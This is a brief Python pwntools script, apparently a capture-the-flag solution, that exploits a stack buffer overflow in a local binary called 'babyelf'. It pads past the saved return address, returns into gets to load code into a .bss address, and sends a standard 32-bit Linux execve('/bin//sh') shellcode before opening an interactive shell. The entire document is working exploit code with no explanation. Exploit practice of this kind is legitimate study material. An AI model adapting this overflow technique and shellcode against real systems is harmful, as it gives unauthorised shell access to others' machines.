from pwn import *

p = process('./babyelf')
print p.recvline()

bss_address = 0x0804A049
gets_call = 0x08048370



shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
peilot = 'A'*(0x44+4)+p32(gets_call)+p32(bss_address)+p32(bss_address)

p.sendline(peilot)
p.sendline(shellcode)
p.interactive()
